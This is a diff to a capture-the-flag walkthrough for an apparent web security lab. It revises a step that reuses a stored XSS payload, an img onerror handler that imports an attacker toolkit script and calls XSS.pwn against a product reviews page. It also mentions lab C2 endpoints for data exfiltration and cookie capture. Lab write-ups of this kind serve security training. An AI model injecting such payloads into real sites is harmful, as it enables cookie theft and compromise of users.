@@ -319,21 +319,22 @@ We never checked what `/attacker/api/exfil` or `/attacker/api/cookie` **return**
 
 **Step 18 — check the C2 exfil/cookie response bodies.**
 
-Re-fire the `pwn()` payload (or any exfil), then in **Network**:
-1. Click `POST /attacker/api/exfil` → **Response** tab — what's the body? (Ctrl+F for `FLAG`/`flag`/`ref`)
-2. Click `GET /attacker/api/cookie?c=...` → **Response** tab — what's the body?
-
-If you want to re-fire, use the known-good name-field payload:
+On page
+```url
+http://web0x0c.hbtn/product/1/reviews/all
+```
+we're going to reuse our best payload till now:
 ```html
 <img/src/onerror=import(`/attacker/toolkit.js`).then(function(){XSS.pwn(12,3,`/products/sort/api/track`)})>
 ```
+with some modifications.
 
 In the C2 description we have:
 ```js
 XSS.pwn(level, stage, callbackPath)  // Full compromise + flag capture
 ```
 
-The callbackPath we can try to find out using the experience from Task 0 and Task 1.
+The callbackPath is not good, since we're not doing sorting. We can try to find out the correct path using the experience from Task 0 and Task 1.
 After a few try/error attempts we identified a path which is not returning 404:
 
 ```url
